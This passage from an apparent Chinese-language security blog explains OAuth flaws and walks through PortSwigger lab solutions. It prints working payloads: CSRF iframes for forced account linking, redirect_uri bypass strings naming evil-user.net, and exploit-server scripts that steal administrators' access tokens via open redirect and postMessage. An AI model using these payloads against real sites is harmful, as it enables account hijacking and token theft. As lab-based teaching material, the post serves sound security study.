+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /authorization?client_id=12345&amp;redirect_uri=https://client-app.com/callback&amp;response_type=token&amp;scope=openid%20profile&amp;state=ae13d489bd00e3c24 HTTP/1.1 </span><br><span class="line">Host: oauth-authorization-server.com</span><br></pre></td></tr></table></figure>
+
+<h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h4><p>在识别漏洞时，对所使用的OAuth服务进行一些基本的信息收集很重要。<br>首先应该研究构成OAuth flow的各种HTTP交互，如果使用外部OAuth服务，应该能够从发送授权请求的主机名中识别特定的API。由于这些服务提供了一个公共API，因此通常会提供详细的文档，可以挖掘各种有用的信息，例如端点的确切名称以及正在使用的配置选项。<br>一旦知道授权服务器的主机名，就应该尝试向以下标准端点发送GET请求：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/.well-known/oauth-authorization-server</span><br><span class="line">/.well-known/openid-configuration</span><br></pre></td></tr></table></figure>
+
+<p>它们通常会返回包含关键信息的JSON配置文件，例如可能支持的其他功能的详细信息。这有时可以了解文档中未提及的更广泛的攻击面。</p>
+<h4 id="如何利用OAuth身份验证漏洞？"><a href="#如何利用OAuth身份验证漏洞？" class="headerlink" title="如何利用OAuth身份验证漏洞？"></a>如何利用OAuth身份验证漏洞？</h4><p>漏洞的出现源于客户端应用程序的OAuth实现以及OAuth服务本身的配置，后面将分别介绍</p>
+<h4 id="OAuth客户端应用程序中的漏洞"><a href="#OAuth客户端应用程序中的漏洞" class="headerlink" title="OAuth客户端应用程序中的漏洞"></a>OAuth客户端应用程序中的漏洞</h4><p>OAuth规范的定义相对宽松，这对于客户端应用程序的实现尤其如此，OAuth flow中有许多部分，每个授权类型中都有许多可选参数和配置设置，这意味着存在大量的错误配置空间。</p>
+<h5 id="隐式授权类型中的实现不适当"><a href="#隐式授权类型中的实现不适当" class="headerlink" title="隐式授权类型中的实现不适当"></a>隐式授权类型中的实现不适当</h5><p>由于通过浏览器发送访问令牌所带来的危险，隐式授权类型主要推荐用于单页应用程序。然而，由于其相对简单，它也经常用于经典的客户端-服务器web应用程序。<br>在此流程中，访问令牌作为URL片段通过用户的浏览器发送到客户端应用程序。然后，客户端应用程序使用JavaScript访问令牌。问题是，如果应用程序希望在用户关闭页面后保持会话，则需要将当前用户数据（通常是用户ID和访问令牌）存储在某处。</p>
+<p>为了解决这个问题，客户端应用程序通常会在POST请求中将这些数据提交给服务器，然后为用户分配一个会话cookie。该请求大致相当于表单提交请求，该请求可能作为经典的基于密码的登录的一部分发送。然而，在这种情况下，服务器没有任何数据与提交的数据进行比较，这意味着它是默认信任的。<br>在隐式流中，此POST请求通过浏览器暴露给攻击者。因此，如果客户端应用程序未正确检查访问令牌是否与请求中的其他数据匹配，则此行为可能会导致严重的漏洞。在这种情况下，攻击者可以简单地更改发送到服务器的参数以模拟任何用户。</p>
+<p>比如上面的那个例子。</p>
+<h5 id="缺乏CSRF保护"><a href="#缺乏CSRF保护" class="headerlink" title="缺乏CSRF保护"></a>缺乏CSRF保护</h5><p>OAuth flow的许多组件是可选的，其中一个这样的例子是state参数。</p>
+<p>理想情况下，state参数应该包含一个随机的值，例如当用户首次启动OAuth flow时，与用户会话相关的某个对象的哈希值。然后，该值作为客户端应用程序的CSRF令牌形式在客户端应用程序和OAuth service之间来回传递。因此，如果授权请求没有发送state参数，从攻击者的角度来看，这就有利用的可能。</p>
+<p>比如，一个允许用户使用经典的基于密码的登录机制或通过使用OAuth将其帐户链接到社交媒体配置文件来登录的网站。在这种情况下，如果应用程序无法使用state参数，攻击者可能会通过将受害用户的帐户绑定到攻击者自己的社交媒体帐户来劫持受害者的帐户。</p>
+<p>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking</span><br></pre></td></tr></table></figure>
+
+<p>网站为用户提供了将社交媒体配置文件附加到帐户的选项，以便可以通过OAuth登录，而不是使用用户名和密码。<br>要求：使用CSRF攻击攻击者的社交媒体配置文件附加到网站上的管理员用户帐户，然后访问管理员面板并删除Carlos用户。<br>首先观察OAuth flow的过程</p>
+<p><a href="https://smms.app/image/A3XsOe6WicUtmLZ" target="_blank"><img src="https://s2.loli.net/2024/01/14/A3XsOe6WicUtmLZ.png" ></a></p>
+<p>先用传统的账号密码登录，登录成功之后发现有Attach a social profile选项</p>
+<p><a href="https://smms.app/image/mu1bUB6djKfWR8s" target="_blank"><img src="https://s2.loli.net/2024/01/14/mu1bUB6djKfWR8s.png" ></a></p>
+<p>然后开始绑定社交账号</p>
+<p><a href="https://smms.app/image/dXvrCD1sIVNKQGy" target="_blank"><img src="https://s2.loli.net/2024/01/14/dXvrCD1sIVNKQGy.png" ></a></p>
+<p>绑定成功之后，Log out，再次重新登录时可以发现不需要输入用户名和密码就可以直接登录了，现在来分析绑定社交账号过程（即上面的Attach a social profile）中OAuth flow</p>
+<p>首先还是GET &#x2F;auth?client_id[…] 的请求，发现里面的redirect_uri会将authorization code发送到&#x2F;oauth-linking，同时请求中是不含state参数的</p>
+<p><a href="https://smms.app/image/XMzELCpIx853Db7" target="_blank"><img src="https://s2.loli.net/2024/01/14/XMzELCpIx853Db7.png" ></a></p>
+<p>然后会带着拿到的code去请求&#x2F;oauth-linking，随后绑定成功</p>
+<p><a href="https://smms.app/image/e5BPSlIU2xGYHaf" target="_blank"><img src="https://s2.loli.net/2024/01/14/e5BPSlIU2xGYHaf.png" ></a></p>
+<p>现在打开抓包，一直Forward直到抓到GET &#x2F;oauth-linking?code&#x3D;[…]这个包，把url复制下来，丢掉这个包，丢掉的目的是确保code是可用的，然后在目标服务器上新建一个CSRF的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当管理员点开这个链接的时候，攻击者的社交账户就会绑定到管理员的账号上</p>
+<h5 id="泄露authorization-codes和access-tokens"><a href="#泄露authorization-codes和access-tokens" class="headerlink" title="泄露authorization codes和access tokens"></a>泄露authorization codes和access tokens</h5><p>基于OAuth的漏洞可能是OAuth服务本身的配置使攻击者能够窃取authorization code或访问与其他用户帐户相关的access token。通过窃取有效的code或token，攻击者可以访问受害者的数据，并可能会以受害用户的身份登录到注册了此OAuth服务的任何客户端应用程序。</p>
+<p>根据授权类型，authorization code或access token会通过浏览器发送到授权请求的redirect_uri参数里指定的回调端点（&#x2F;callback endpoint）。如果OAuth服务未能正确验证此URI，攻击者可能会构造类似CSRF的攻击，诱使受害者的浏览器启动OAuth流，将authorization code或access token发送给攻击者控制的redirect_URI。</p>
+<p>在authorization code flow的过程中，攻击者可能会在受害者的code被使用之前窃取其code。然后把这个code发送给合法的回调端点（原始的end point），这种情况下，攻击者甚至不需要知道access token。只要受害者和OAuth service之间有活跃的session，客户端应用程序就会完成code&#x2F;token交换，然后将攻击者登录到受害者的帐户。注意state或者nonce参数也不一定能保护这些攻击，因为攻击者可以在自己的浏览器中生成新的值。</p>
+<p>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri</span><br></pre></td></tr></table></figure>
+
+<p>要求，窃取与管理员用户相关的authorization code，然后使用其访问管理员的帐户并删除Carlos用户。</p>
+<p>按照相同的方法登陆账户，之后log out，再次登陆账户发现不需要输入凭证了，观察http history</p>
+<p>发现当发送GET &#x2F;auth?client_id&#x3D;[…] 请求之后，会被重定向到redirect_uri指向的地址，同时这个请求是带有code参数的</p>
+<p><a href="https://smms.app/image/TXUj8nS4zFLGRtA" target="_blank"><img src="https://s2.loli.net/2024/01/14/TXUj8nS4zFLGRtA.png" ></a></p>
+<p>在reapter中，可以看到能将redirect_uri改成任意地址，客户端不会校验这个地址是否合法，将这个地址改成exploit server的地址，查看日志，发现日志里出现了带有code的请求，这意味着可以将authorization code泄露到外部域中</p>
+<p><a href="https://smms.app/image/tnfv4pQWLRYXuyj" target="_blank"><img src="https://s2.loli.net/2024/01/14/tnfv4pQWLRYXuyj.png" ></a></p>
+<p>创建payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;https://YOUR-LAB-OAUTH-SERVER-ID.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&amp;redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&amp;response_type=code&amp;scope=openid%20profile%20email&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后在exploit server中看到管理员的code，拿着这个code去访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/oauth-callback?code=...</span><br></pre></td></tr></table></figure>
+
+<h5 id="有缺陷的重定向URI验证"><a href="#有缺陷的重定向URI验证" class="headerlink" title="有缺陷的重定向URI验证"></a>有缺陷的重定向URI验证</h5><p>由于在之前提到的各种攻击，客户端应用程序在注册OAuth服务时最好提供其真实回调URI的白名单。这样，当OAuth服务收到一个新请求时，它可以根据这个白名单验证redirect_uri参数。然而，仍有可能绕过此验证。</p>
+<p>在分析OAuth flow时，应该去测试redirect_uri参数来观察其是验证逻辑的。例如：</p>
+<ul>
+<li>一些校验只检查字符串是否以特定的字符序列开头。可以尝试删除或添加任意路径、查询参数和片段，来查看可以在不触发错误的情况下更改哪些内容。</li>
+<li>可能偶尔会遇到服务器端参数污染漏洞，可以尝试提交重复的redirect_uri参数</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://oauth-authorization-server.com/?client_id=123&amp;redirect_uri=client-app.com/callback&amp;redirect_uri=evil-user.net</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>一些服务器还对localhost进行特殊处理，在某些情况下，应用程序可能会允许任何以localhost开头的重定向URI，这可以通过注册域名（如localhost.evil-user.net）来绕过验证。</li>
+</ul>
+<p>需要注意的是，不应该将测试局限于单独测试redirect_uri参数。有时候，通常需要尝试对多个参数进行不同组合的更改，有时更改一个参数会影响其他参数的验证。</p>
+<h5 id="通过代理页面窃取代码和访问令牌"><a href="#通过代理页面窃取代码和访问令牌" class="headerlink" title="通过代理页面窃取代码和访问令牌"></a>通过代理页面窃取代码和访问令牌</h5><p>对于某些的目标，攻击者可能会发现，无论怎么尝试，都无法成功提交外部域作为redirect_uri。</p>
+<p>在此阶段，应该对可以篡改URI的哪些部分有了相对较好的了解。现在的关键是使用这些知识来发现客户端应用程序本身中更广泛的攻击面。换句话说，尝试确定是否可以更改redirect_uri参数以指向白名单域上的任何其他页面。</p>
+<p>尝试找到可以成功访问不同子域或路径的方法。例如，默认URI通常位于OAuth特定路径上，例如&#x2F;OAuth&#x2F;callback，可以使用目录遍历的方法来遍历域上的任意路径。类似于：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://client-app.com/oauth/callback/../../example/path</span><br></pre></td></tr></table></figure>
+
+<p>也就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://client-app.com/example/path</span><br></pre></td></tr></table></figure>
+
+<p>一旦确定可以将哪些其他页面设置为重定向URI，就应该对它们进行审计，以发现可能用于泄漏代码或令牌的其他漏洞。对于授权码方式，需要找到允许访问参数的漏洞，而对于隐式授权类型，需要提取URL片段。</p>
+<p>对于隐式授权类型，窃取access token不仅仅使攻击者能够登录到受害者的帐户。由于整个隐式流都是通过浏览器进行的，还可以使用令牌对OAuth服务的资源服务器进行API调用，这可能使攻击者能够获取通常无法从客户端应用程序的web UI访问的敏感用户数据。</p>
+<h6 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect</span><br></pre></td></tr></table></figure>
+
+<p>该环境下的OAuth服务的验证缺陷使攻击者有可能将访问令牌泄漏到客户端应用程序上的任意页面。</p>
+<p>要求博客网站上识别一个开放的重定向，并使用该重定向窃取管理员用户帐户的access token。</p>
+<p>首先还是正常登录账户之后log out，重新登录，分析OAuth flow</p>
+<p>找到GET &#x2F;auth?client_id&#x3D;[…]请求，修改其中的redirect_uri，发现无法实现任意地址的重定向（返回400 Bad Request），但是可以目录穿越，也就是&#x2F;..&#x2F;</p>
+<p><a href="https://smms.app/image/GE6j851OFieNCmA" target="_blank"><img src="https://s2.loli.net/2024/01/14/GE6j851OFieNCmA.png" ></a></p>
+<p>目录穿越，返回的数据包会将access token带上</p>
+<p><a href="https://smms.app/image/rD9eaPl7IcpWHM3" target="_blank"><img src="https://s2.loli.net/2024/01/14/rD9eaPl7IcpWHM3.png" ></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Found</span><br><span class="line">...</span><br><span class="line">Location: https://0a1c00bd048757c7c0fc7c9400dc00f3.web-security-academy.net/oauth-callback/../#access_token=9D-wdhQ4vdUdnZI6lIDsO4BlTrREk-SNwTr3RvRYA9w&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Redirecting to &lt;a href=&quot;https://0a1c00bd048757c7c0fc7c9400dc00f3.web-security-academy.net/oauth-callback/../#access_token=9D-wdhQ4vdUdnZI6lIDsO4BlTrREk-SNwTr3RvRYA9w&amp;amp;expires_in=3600&amp;amp;token_type=Bearer&amp;amp;scope=openid%20profile%20email&quot;&gt;https://0a1c00bd048757c7c0fc7c9400dc00f3.web-security-academy.net/oauth-callback/../#access_token=9D-wdhQ4vdUdnZI6lIDsO4BlTrREk-SNwTr3RvRYA9w&amp;amp;expires_in=3600&amp;amp;token_type=Bearer&amp;amp;scope=openid%20profile%20email&lt;/a&gt;.</span><br></pre></td></tr></table></figure>
+
+<p>开启抓包，将redirect_uri改为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1</span><br></pre></td></tr></table></figure>
+
+<p>然后会发现浏览器被重定向到第一篇上传的博客，同时注意到access token被URL作为#之后的参数</p>
+<p>即：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0a1c00bd048757c7c0fc7c9400dc00f3.web-security-academy.net/post?postId=1#access_token=JTFbScGKKN0DU4gxNKhn8TestdRSeIlKTtQ2EMNk5ts&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email</span><br></pre></td></tr></table></figure>
+
+<p>然后我们在博客的Next Post的地方抓包</p>
+<p><a href="https://smms.app/image/UxQ4yroSLTGX9pn" target="_blank"><img src="https://s2.loli.net/2024/01/14/UxQ4yroSLTGX9pn.png" ></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /post/next?path=/post?postId=2 HTTP/1.1</span><br><span class="line">Host: 0a1c00bd048757c7c0fc7c9400dc00f3.web-security-academy.net</span><br><span class="line">Cookie: session=LEJBxMrn2bx9mVk4vyjbbZ6A39SYWvH9</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>这里的path参数是可以任意修改的，也就是可以实现任意地址重定向</p>
+<p>那么恶意的url就可以是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://YOUR-LAB-OAUTH-SERVER.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&amp;redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&amp;response_type=token&amp;nonce=399721827&amp;scope=openid%20profile%20email</span><br></pre></td></tr></table></figure>
+
+<p>在浏览器里直接访问上面的URL，会被重定向到<a target="_blank" rel="noopener" href="https://exploit-0a94004004505774c04c7b8b01c20062.exploit-server.net/exploit">https://exploit-0a94004004505774c04c7b8b01c20062.exploit-server.net/exploit</a></p>
+<p>同时参数里带有access token，即：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://exploit-0a94004004505774c04c7b8b01c20062.exploit-server.net/exploit#access_token=toCpeo1onKyk_H2L6zcv9tILWhqd_izQ92bh73cMi3O&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email</span><br></pre></td></tr></table></figure>
+
+<p>在exploit server上创建恶意脚本</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="comment">//如果当前URL没有hash（#之后的字符串）</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">hash</span>) &#123;</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&#x27;https://YOUR-LAB-OAUTH-SERVER.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&amp;redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&amp;response_type=token&amp;nonce=399721827&amp;scope=openid%20profile%20email&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//如果当前URL有hash</span></span><br><span class="line">	<span class="comment">//&#x27;/?&#x27;代表的是当前URL的根目录，比如www.google.com/a/b/c，也就是www.google.com</span></span><br><span class="line">	<span class="comment">//我个人感觉判断当前URL有hash并跳转至当前URL的根路径没有很大的用处，如果当前URL不是exploit server的话，跳过去也不会有日志</span></span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&#x27;/?&#x27;</span>+<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">hash</span>.<span class="title function_">substr</span>(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在exploit server的日志中发现admin的access token</p>
+<p><a href="https://smms.app/image/CQzY52JlLtjsShX" target="_blank"><img src="https://s2.loli.net/2024/01/14/CQzY52JlLtjsShX.png" ></a></p>
+<p>然后根据前面的抓包可以知道，获取用户的API key是利用access token访问&#x2F;me接口得到的</p>
+<p><a href="https://smms.app/image/a2bwdMgnYJxpPSQ" target="_blank"><img src="https://s2.loli.net/2024/01/14/a2bwdMgnYJxpPSQ.png" ></a></p>
+<p>将Authorization字段改为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Bearer YOUR-ACCESS-TOKEN</span><br></pre></td></tr></table></figure>
+
+<p>除了开放重定向之外，还应挖掘允许攻击者提取code或token并将其发送到外部域的任何其他漏洞。</p>
+<p>比如，HTML注入，在无法注入JavaScript的情况下（例如，由于CSP约束或严格过滤），仍然可以使用简单的HTML注入来窃取授权代码。如果可以将redirect_uri参数指向可以注入HTML内容的页面，则可能会通过Referer标头泄漏代码。例如，考虑以下img元素：＜img src&#x3D;“evil user.net”＞。当试图获取此图像时，某些浏览器（如Firefox）将在请求的Refer标头中发送完整的URL，包括查询字符串。</p>
+<h6 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page</span><br></pre></td></tr></table></figure>
+
+<p>和上一个其实差不多，只是要求使用另外的方法去拿到admin的access token</p>
+<p>redirect_uri 字段存在目录穿越</p>
+<p>在博客文章的评论处发现存在iframe 标签，标签会从&#x2F;post&#x2F;comment&#x2F;comment-form#postId&#x3D;1加载数据，在burp中看到的请求&#x2F;post&#x2F;comment&#x2F;comment-form的数据包的响应数据包中存在一段JavaScript如下;</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">     <span class="comment">//postMessage这个方法就是用来发送信息的，但是它只能用来在两个窗口之间发送信息</span></span><br><span class="line">    <span class="comment">//参数为 * 表示可以将消息传递给任意窗口</span></span><br><span class="line">     <span class="comment">//设置为页面加载时就将当前的url作为消息发送出去</span></span><br><span class="line">     parent.<span class="title function_">postMessage</span>(&#123;<span class="attr">type</span>: <span class="string">&#x27;onload&#x27;</span>, <span class="attr">data</span>: <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>&#125;, <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">     <span class="keyword">function</span> <span class="title function_">submitForm</span>(<span class="params">form, ev</span>) &#123;</span><br><span class="line">         ev.<span class="title function_">preventDefault</span>();</span><br><span class="line">         <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;comment-form&quot;</span>));</span><br><span class="line">         <span class="keyword">const</span> hashParams = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hash</span>.<span class="title function_">substr</span>(<span class="number">1</span>));</span><br><span class="line">         <span class="keyword">const</span> o = &#123;&#125;;</span><br><span class="line">         formData.<span class="title function_">forEach</span>(<span class="function">(<span class="params">v, k</span>) =&gt;</span> o[k] = v);</span><br><span class="line">         hashParams.<span class="title function_">forEach</span>(<span class="function">(<span class="params">v, k</span>) =&gt;</span> o[k] = v);</span><br><span class="line">         parent.<span class="title function_">postMessage</span>(&#123;<span class="attr">type</span>: <span class="string">&#x27;oncomment&#x27;</span>, <span class="attr">content</span>: o&#125;, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">         form.<span class="title function_">reset</span>();</span><br><span class="line">     &#125;</span><br><span class="line"> &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>现在的恶意脚本就可以这样写并发送给管理员</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;https://YOUR-LAB-AUTH-SERVER/auth?client_id=YOUR-LAB-CLIENT_ID&amp;redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&amp;response_type=token&amp;nonce=-1552239120&amp;scope=openid%20profile%20email&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="title function_">fetch</span>(<span class="string">&quot;/&quot;</span> + <span class="built_in">encodeURIComponent</span>(e.<span class="property">data</span>.<span class="property">data</span>))</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;, <span class="literal">false</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>addEventListener设置当接收到message的时候，就将当前接收到的access token作为URL的一部分发送请求</p>
+<p>在exploit 服务器中就可以看到日志和access token</p>
+<h4 id="scope验证绕过"><a href="#scope验证绕过" class="headerlink" title="scope验证绕过"></a>scope验证绕过</h4><p>在任何OAuth flow中，用户必须根据授权请求中定义的范围来允许访问，这种情况下生成的令牌只能允许应用程序访问用户允许范围内的数据，但是在某些情况下，由于OAuth service有缺陷，攻击者可能会升级access token。</p>
+<h5 id="授权码模式下的权限提升"><a href="#授权码模式下的权限提升" class="headerlink" title="授权码模式下的权限提升"></a>授权码模式下的权限提升</h5><p>使用授权码模式，用户的数据通过server-to-server的方式被请求和发送，第三方攻击者通常无法直接操纵。然而，通过向OAuth service注册他们自己的客户端应用程序，仍然可以实现相同的结果。</p>
+<p>比如，攻击者的恶意客户端应用程序最初只是请求用户的email地址访问权限（使用openid email作为scope参数的值），当用户允许这个请求之后，恶意应用程序就会收到一个authorization code，由于攻击者是控制着恶意应用程序的，攻击者可以在scope参数中添加新的profile值来放到code&#x2F;token交换请求中，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /token</span><br><span class="line">Host: oauth-authorization-server.com</span><br><span class="line">…</span><br><span class="line">client_id=12345&amp;client_secret=SECRET&amp;redirect_uri=https://client-app.com/callback&amp;grant_type=authorization_code&amp;code=a1b2c3d4e5f6g7h8&amp;scope=openid%20 email%20profile</span><br></pre></td></tr></table></figure>
+
+<p>如果认证服务器没有对这个请求中的scope和最初认证请求进行验证，有时候就会根据攻击者请求的scope生成一个新的access token</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;access_token&quot;: &quot;z0y9x8w7v6u5&quot;,</span><br><span class="line">    &quot;token_type&quot;: &quot;Bearer&quot;,</span><br><span class="line">    &quot;expires_in&quot;: 3600,</span><br><span class="line">    &quot;scope&quot;: &quot;openid email profile&quot;,</span><br><span class="line">    …</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后，攻击者可以使用其应用程序进行必要的API调用，以访问用户的配置文件数据。</p>
+<h5 id="隐式授权下的权限提升"><a href="#隐式授权下的权限提升" class="headerlink" title="隐式授权下的权限提升"></a>隐式授权下的权限提升</h5><p>对于隐式授权类型，access token通过浏览器发送，这意味着攻击者可以窃取令牌并直接使用它们。一旦成功，攻击者就可以向OAuth服务的&#x2F;userinfo端点发送请求，在请求过程中手动添加一个新的scope参数。</p>
+<p>理想情况下，OAuth服务应该根据生成令牌时使用的scope验证此scope，但只要调整后的权限不超过先前授予此客户端应用程序的访问级别，攻击者就可以访问其他数据，而无需用户进一步批准。</p>
+<h4 id="未经验证的用户注册"><a href="#未经验证的用户注册" class="headerlink" title="未经验证的用户注册"></a>未经验证的用户注册</h4><p>当通过OAuth进行用户验证时，客户端应用程序会默认假设OAuth provider存储的信息是正确的，这就有潜在的危险。</p>
+<p>一些提供OAuth service的网站允许用户注册帐户，而无需验证其所有详细信息，比如不验证电子邮件地址。这种情况下，攻击者可以通过使用与目标用户相同的详细信息（例如已知的电子邮件地址）向OAuth provider注册帐户来利用此漏洞。然后，客户端应用程序可能允许攻击者通过使用OAuth provider注册的虚假帐户来以受害者身份登录。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
